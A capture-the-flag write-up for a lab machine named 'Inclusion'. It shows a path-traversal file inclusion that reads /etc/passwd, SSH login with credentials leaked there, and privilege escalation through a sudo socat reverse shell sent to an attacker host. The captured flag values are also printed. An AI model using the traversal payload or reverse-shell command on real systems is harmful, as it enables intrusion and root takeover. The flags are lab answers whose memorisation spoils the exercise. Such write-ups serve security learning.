# Inclusion

> Mihai Stanciu | 31 January 2021

```
export ip=10.10.37.10
```

## Nmap scan in `nmap/initial`

* Open ports - `22 & 80`

## Gobuster scan in `gobuster/initial`

* Nothing to be found

## Performed LFI(Local File Inclusion) with this route `http://10.10.37.10/article?name=../../../../../../../../etc/passwd`

* Response

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash

#falconfeast:rootpassword

sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

**Note**: Found _ssh credentials_ - `falconfeast:rootpassword`

## Got in through ssh

1. Found first flag in `/home/falconfeast/user.txt`

```
60989655118397345799
```

2. Found `socat` running as _root with no passwd_

* Searched [GTFOBins](https://gtfobins.github.io/gtfobins/socat/)

* Ran command `socat file:`tty`,raw,echo=0 tcp-listen:12345` to listen on _attacker_ machine

* On victim ran command `sudo socat tcp-connect:$atacker-ip:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane`

**Spawned root shell on attacker machine**.

**Found root flag in `/root/root.txt`**

```
42964104845495153909
```